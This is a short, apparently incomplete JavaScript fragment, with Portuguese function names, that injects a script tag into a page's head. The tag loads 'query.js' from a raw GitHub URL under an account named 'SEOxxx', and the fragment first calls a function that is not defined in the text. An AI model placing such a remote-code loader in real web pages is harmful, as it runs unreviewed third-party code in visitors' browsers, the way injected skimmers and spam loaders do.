carregarScriptAutomaticamente();

  function adicionarScriptNaHead(url) {
  var scriptTag = document.createElement('script');
  scriptTag.src = url;
  document.head.appendChild(scriptTag);
}

adicionarScriptNaHead('https://raw.githubusercontent.com/SEOxxx/y/main/query.js');
